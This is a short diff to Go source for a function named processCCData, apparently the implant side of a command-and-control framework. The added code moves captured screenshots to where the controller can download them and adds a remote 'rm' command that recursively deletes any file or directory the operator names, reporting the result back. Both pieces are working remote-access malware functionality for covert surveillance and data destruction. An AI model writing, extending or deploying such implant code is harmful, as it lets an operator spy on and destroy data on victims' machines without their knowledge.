@@ -52,6 +52,12 @@ func processCCData(data *MsgTunData) {
 				out = "Error: failed to take screenshot"
 			}
 
+			// move to agent root
+			err = os.Rename(out, AgentRoot+"/"+out)
+			if err == nil {
+				out = AgentRoot + "/" + out
+			}
+
 			// tell CC where to download the file
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
@@ -76,6 +82,20 @@ func processCCData(data *MsgTunData) {
 			if err != nil {
 				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, err.Error())
 			}
+			goto send
+		}
+
+		// remove file/dir
+		if cmdSlice[0] == "rm" {
+			out = "rm failed"
+			if len(cmdSlice) != 2 {
+				return
+			}
+
+			if os.RemoveAll(cmdSlice[1]) == nil {
+				out = "Deleted " + cmdSlice[1]
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
 		}
 
